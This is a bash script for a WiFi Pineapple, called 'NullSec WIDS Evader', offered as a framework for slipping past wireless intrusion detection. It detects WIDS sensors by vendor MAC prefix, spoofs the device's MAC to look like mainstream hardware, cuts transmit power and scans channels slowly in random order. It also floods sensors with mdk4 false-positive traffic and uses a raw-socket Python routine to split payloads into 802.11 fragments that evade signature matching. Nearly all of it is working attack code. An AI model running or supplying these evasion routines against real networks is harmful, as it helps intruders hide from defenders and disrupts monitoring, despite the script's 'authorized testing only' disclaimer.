#!/bin/bash
#═══════════════════════════════════════════════════════════════════════════════
# NullSec WIDS Evader
# Wireless Intrusion Detection System evasion techniques
#
# For authorized security testing only!
# Credits: Built for Hak5 WiFi Pineapple - https://hak5.org
#═══════════════════════════════════════════════════════════════════════════════

VERSION="1.0"
LOOT_DIR="/mmc/nullsec/wids-evader"
DATE_TAG=$(date +%Y%m%d_%H%M%S)
IFACE="wlan0mon"
LOG_FILE="$LOOT_DIR/evasion_${DATE_TAG}.log"
PROFILE="stealth"  # stealth, moderate, aggressive

mkdir -p "$LOOT_DIR"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

banner() {
    echo -e "${YELLOW}"
    cat << 'EOF'
    ╔═══════════════════════════════════════════════════════════════╗
    ║             NULLSEC WIDS EVADER v1.0                          ║
    ║                                                               ║
    ║         Wireless IDS/IPS Evasion Framework                    ║
    ╚═══════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

log() {
    local level="$1"
    shift
    case "$level" in
        INFO)   echo -e "${GREEN}[INFO]${NC} $*" ;;
        WARN)   echo -e "${YELLOW}[WARN]${NC} $*" ;;
        ALERT)  echo -e "${RED}[ALERT]${NC} $*" ;;
        EVADE)  echo -e "${MAGENTA}[EVADE]${NC} $*" ;;
        SCAN)   echo -e "${CYAN}[SCAN]${NC} $*" ;;
    esac
    echo "[$(date '+%H:%M:%S')] [$level] $*" >> "$LOG_FILE"
}

# Profile-based timing
get_delay() {
    case "$PROFILE" in
        stealth)
            # Random 5-30 second delays
            awk "BEGIN{srand(); print int(5 + rand() * 25)}"
            ;;
        moderate)
            # 1-5 second delays
            awk "BEGIN{srand(); print 1 + rand() * 4}"
            ;;
        aggressive)
            # 0.1-1 second delays
            awk "BEGIN{srand(); print 0.1 + rand() * 0.9}"
            ;;
    esac
}

# Detect WIDS presence
detect_wids() {
    log SCAN "Scanning for WIDS/WIPS sensors..."
    
    WIDS_REPORT="$LOOT_DIR/wids_detected.txt"
    > "$WIDS_REPORT"
    
    # Known WIDS MAC OUI prefixes
    WIDS_OUIS=(
        "00:13:72"  # AirMagnet
        "00:0b:85"  # AirTight
        "00:1a:1e"  # Aruba
        "00:0c:e6"  # Meru
        "00:1c:b3"  # Cisco (some sensors)
        "00:24:6c"  # Motorola AirDefense
        "00:23:04"  # Fluke/AirCheck
    )
    
    # Scan for known WIDS OUIs
    airodump-ng --output-format csv -w /tmp/wids_scan "$IFACE" &>/dev/null &
    PID=$!
    sleep 30
    kill $PID 2>/dev/null
    
    grep -E "^[0-9A-F]{2}:" /tmp/wids_scan*.csv 2>/dev/null | \
    while IFS=',' read -r bssid _ _ ch _ enc _ _ power _ _ _ essid _; do
        bssid_upper=$(echo "$bssid" | tr -d ' ' | tr '[:lower:]' '[:upper:]')
        oui=$(echo "$bssid_upper" | cut -d: -f1-3)
        
        for wids_oui in "${WIDS_OUIS[@]}"; do
            woui=$(echo "$wids_oui" | tr '[:lower:]' '[:upper:]')
            if [ "$oui" = "$woui" ]; then
                log ALERT "WIDS SENSOR DETECTED: $bssid_upper ($(echo "$essid" | tr -d ' '))"
                echo "$bssid_upper|$essid|$ch|$power" >> "$WIDS_REPORT"
            fi
        done
    done
    
    # Look for suspicious APs in monitor mode (passive sensors)
    # Sensors often have no SSID and unusual power levels
    grep -E "^[0-9A-F]{2}:" /tmp/wids_scan*.csv 2>/dev/null | \
    while IFS=',' read -r bssid _ _ ch _ enc _ _ power _ _ _ essid _; do
        essid_clean=$(echo "$essid" | tr -d ' ')
        power_clean=$(echo "$power" | tr -d ' ')
        
        # Sensor indicators: no SSID, consistent power, no clients
        if [ -z "$essid_clean" ] && [ "$power_clean" -gt -60 ] 2>/dev/null; then
            log WARN "Possible passive sensor: $(echo "$bssid" | tr -d ' ') (power: ${power_clean}dBm)"
        fi
    done
    
    SENSOR_COUNT=$(wc -l < "$WIDS_REPORT" 2>/dev/null || echo 0)
    log INFO "WIDS scan complete: $SENSOR_COUNT sensors identified"
    
    rm -f /tmp/wids_scan* 2>/dev/null
}

# MAC randomization with vendor matching
mac_randomize() {
    local target_vendor="${1:-random}"
    
    log EVADE "MAC randomization: vendor=$target_vendor"
    
    # Save original
    ORIG_MAC=$(cat "/sys/class/net/${IFACE%mon}/address" 2>/dev/null || echo "unknown")
    
    # Common legitimate vendor OUIs
    declare -A VENDOR_OUIS
    VENDOR_OUIS[apple]="00:1f:f3 a4:83:e7 ac:bc:32 d0:03:4b"
    VENDOR_OUIS[samsung]="a8:9f:ba 50:01:d9 e4:7c:f9 34:23:87"
    VENDOR_OUIS[intel]="00:1e:64 3c:97:0e 68:17:29 80:86:f2"
    VENDOR_OUIS[google]="f4:f5:d8 94:eb:2c 54:60:09"
    VENDOR_OUIS[microsoft]="00:0d:3a 7c:1e:52 28:18:78"
    VENDOR_OUIS[realtek]="00:e0:4c 52:54:00 48:5b:39"
    
    if [ "$target_vendor" = "random" ]; then
        # Pick random vendor
        local vendors=("apple" "samsung" "intel" "google" "realtek")
        target_vendor=${vendors[$((RANDOM % ${#vendors[@]}))]}
    fi
    
    # Get OUI for vendor
    local ouis=(${VENDOR_OUIS[$target_vendor]})
    if [ ${#ouis[@]} -eq 0 ]; then
        ouis=("00:1f:f3")  # fallback to Apple
    fi
    
    local oui=${ouis[$((RANDOM % ${#ouis[@]}))]}
    local new_mac="${oui}:$(printf '%02x:%02x:%02x' $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))"
    
    # Apply new MAC
    ip link set "$IFACE" down 2>/dev/null
    ip link set "$IFACE" address "$new_mac" 2>/dev/null
    ip link set "$IFACE" up 2>/dev/null
    
    log EVADE "MAC changed: $ORIG_MAC → $new_mac ($target_vendor)"
    echo "$new_mac"
}

# Slow scan to avoid rate-based detection
slow_scan() {
    local target_bssid="$1"
    
    log EVADE "Ultra-slow scan mode (profile: $PROFILE)..."
    
    SCAN_RESULT="$LOOT_DIR/slow_scan_${DATE_TAG}.txt"
    
    # Randomize channel order
    local channels=(1 6 11 2 3 4 5 7 8 9 10 12 13)
    for i in $(seq $((${#channels[@]} - 1)) -1 1); do
        j=$((RANDOM % (i + 1)))
        tmp=${channels[$i]}
        channels[$i]=${channels[$j]}
        channels[$j]=$tmp
    done
    
    for ch in "${channels[@]}"; do
        # Change MAC before each channel
        mac_randomize "random" > /dev/null
        
        # Set channel
        iwconfig "$IFACE" channel "$ch" 2>/dev/null
        
        # Brief passive listen (no active probing)
        timeout 5 tcpdump -i "$IFACE" -c 50 -w "/tmp/slowscan_ch${ch}.pcap" 2>/dev/null
        
        # Extract info
        tshark -r "/tmp/slowscan_ch${ch}.pcap" -T fields \
            -e wlan.sa -e wlan.bssid -e wlan.ssid -e radiotap.dbm_antsignal \
            2>/dev/null | sort -u | while IFS=$'\t' read -r sa bssid ssid power; do
            [ -z "$bssid" ] && continue
            echo "CH$ch|$bssid|$ssid|${power}dBm" >> "$SCAN_RESULT"
        done
        
        rm -f "/tmp/slowscan_ch${ch}.pcap"
        
        # Profile-based delay between channels
        local delay=$(get_delay)
        log EVADE "  CH$ch scanned, sleeping ${delay}s..."
        sleep "$delay"
    done
    
    # Deduplicate results
    sort -t'|' -k2 -u "$SCAN_RESULT" -o "$SCAN_RESULT"
    local total=$(wc -l < "$SCAN_RESULT" 2>/dev/null)
    log INFO "Slow scan complete: $total unique APs"
}

# Power control evasion
power_control() {
    local target_power="${1:-5}"
    
    log EVADE "Setting TX power to ${target_power}dBm (low-profile)"
    
    # Reduce TX power to minimize detection range
    iwconfig "$IFACE" txpower "$target_power" 2>/dev/null
    
    local current=$(iwconfig "$IFACE" 2>/dev/null | grep -oP 'Tx-Power=\K[0-9]+')
    log INFO "TX Power set to ${current}dBm"
}

# Fragment evasion - split frames to bypass IDS signature matching
fragment_evasion() {
    local target_bssid="$1"
    local payload_file="$2"
    
    log EVADE "Fragment evasion: splitting payload across fragments..."
    
    if [ ! -f "$payload_file" ]; then
        log WARN "Payload file not found"
        return 1
    fi
    
    python3 << PYEOF
import socket, struct, os

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
s.bind(('$IFACE', 0))

radiotap = bytes.fromhex('0000120000022c0000a00200004000')
bssid = bytes.fromhex('$(echo "$target_bssid" | tr -d ':')')

# Read payload
with open('$payload_file', 'rb') as f:
    data = f.read()

# Fragment into 256-byte chunks
frag_size = 256
fragments = [data[i:i+frag_size] for i in range(0, len(data), frag_size)]
total_frags = len(fragments)

for i, frag in enumerate(fragments):
    # Data frame with fragmentation
    frame_ctrl = 0x0208  # Data, More Fragments
    if i == total_frags - 1:
        frame_ctrl = 0x0200  # Data, Last Fragment
    
    frame = radiotap
    frame += struct.pack('<H', frame_ctrl)
    frame += struct.pack('<H', 0)  # Duration
    frame += bssid + bytes.fromhex('ffffffffffff') + bssid
    frame += struct.pack('<H', (0 << 4) | i)  # Seq=0, Frag=i
    frame += frag
    
    s.send(frame)
    import time
    time.sleep(0.01)

s.close()
print(f"Sent {total_frags} fragments ({len(data)} bytes total)")
PYEOF
    
    log EVADE "Payload fragmented into chunks"
}

# Timing-based evasion - mimic normal traffic patterns
traffic_mimicry() {
    log EVADE "Traffic mimicry mode - blending with normal patterns..."
    
    # Analyze baseline traffic patterns
    log SCAN "Learning baseline traffic patterns (60s)..."
    BASELINE="/tmp/baseline_traffic.pcap"
    timeout 60 tcpdump -i "$IFACE" -w "$BASELINE" 2>/dev/null
    
    # Calculate average inter-frame timing
    local avg_timing=$(tshark -r "$BASELINE" -T fields -e frame.time_delta 2>/dev/null | \
        awk '{sum+=$1; n++} END{if(n>0) print sum/n; else print 0.1}')
    
    log INFO "Baseline avg inter-frame time: ${avg_timing}s"
    log EVADE "Attacks will be paced at ~${avg_timing}s intervals"
    
    rm -f "$BASELINE"
    
    echo "$avg_timing"
}

# WIDS confusion - generate noise to overwhelm sensors
wids_confusion() {
    log EVADE "WIDS confusion attack - overwhelming sensor with false positives..."
    
    local duration="${1:-60}"
    local end_time=$(($(date +%s) + duration))
    local fake_alerts=0
    
    while [ "$(date +%s)" -lt "$end_time" ]; do
        # Generate random fake "attack" patterns
        local attack_type=$((RANDOM % 5))
        
        case $attack_type in
            0)
                # Fake deauth from random MAC
                local fake_src=$(printf '%02x:%02x:%02x:%02x:%02x:%02x' \
                    $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) \
                    $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))
                local fake_dst=$(printf '%02x:%02x:%02x:%02x:%02x:%02x' \
                    $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) \
                    $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))
                ;;
            1)
                # Fake association flood
                ;;
            2)
                # Random probe requests
                ;;
            3)
                # Fake EAP frames
                ;;
            4)
                # Random management frames
                ;;
        esac
        
        # Use mdk4 for randomized frame generation
        if command -v mdk4 &>/dev/null; then
            timeout 2 mdk4 "$IFACE" b -n 1 2>/dev/null
        fi
        
        fake_alerts=$((fake_alerts + 1))
        sleep $(awk "BEGIN{srand(); print 0.1 + rand() * 0.5}")
    done
    
    log EVADE "Confusion attack: generated $fake_alerts false positive triggers"
}

# Full evasion suite
full_evasion() {
    log INFO "Full WIDS evasion suite activated"
    log INFO "Profile: $PROFILE"
    
    # Step 1: Detect sensors
    detect_wids
    
    # Step 2: Reduce power
    power_control 5
    
    # Step 3: Randomize MAC
    local new_mac=$(mac_randomize "intel")
    log INFO "Operating as: $new_mac"
    
    # Step 4: Learn traffic patterns
    local timing=$(traffic_mimicry)
    
    # Step 5: Slow scan with evasion
    slow_scan
    
    log INFO "Evasion suite complete. Operate with learned timing: ${timing}s"
}

# Menu
menu() {
    echo -e "\n${CYAN}WIDS Evasion Modes:${NC}"
    echo -e "  ${GREEN}1)${NC} Detect WIDS Sensors"
    echo -e "  ${GREEN}2)${NC} MAC Randomization"
    echo -e "  ${GREEN}3)${NC} Ultra-Slow Scan"
    echo -e "  ${GREEN}4)${NC} TX Power Control"
    echo -e "  ${GREEN}5)${NC} Traffic Mimicry"
    echo -e "  ${GREEN}6)${NC} WIDS Confusion Attack"
    echo -e "  ${GREEN}7)${NC} Fragment Evasion"
    echo -e "  ${GREEN}8)${NC} Full Evasion Suite"
    echo -e "  ${GREEN}p)${NC} Set Profile [current: $PROFILE]"
    echo -e "  ${GREEN}0)${NC} Exit"
    echo -ne "\n${YELLOW}Select mode: ${NC}"
    read -r mode
    
    case $mode in
        1) detect_wids ;;
        2)
            echo -ne "${YELLOW}Vendor [random]: ${NC}"; read -r v
            mac_randomize "${v:-random}"
            ;;
        3) slow_scan ;;
        4)
            echo -ne "${YELLOW}TX Power dBm [5]: ${NC}"; read -r p
            power_control "${p:-5}"
            ;;
        5) traffic_mimicry ;;
        6)
            echo -ne "${YELLOW}Duration (s) [60]: ${NC}"; read -r d
            wids_confusion "${d:-60}"
            ;;
        7)
            echo -ne "${YELLOW}Target BSSID: ${NC}"; read -r bssid
            echo -ne "${YELLOW}Payload file: ${NC}"; read -r pf
            fragment_evasion "$bssid" "$pf"
            ;;
        8) full_evasion ;;
        p)
            echo -ne "${YELLOW}Profile (stealth/moderate/aggressive): ${NC}"; read -r prof
            PROFILE="${prof:-stealth}"
            log INFO "Profile set to: $PROFILE"
            ;;
        0) exit 0 ;;
    esac
}

main() {
    banner
    
    while true; do
        menu
    done
}

main "$@"
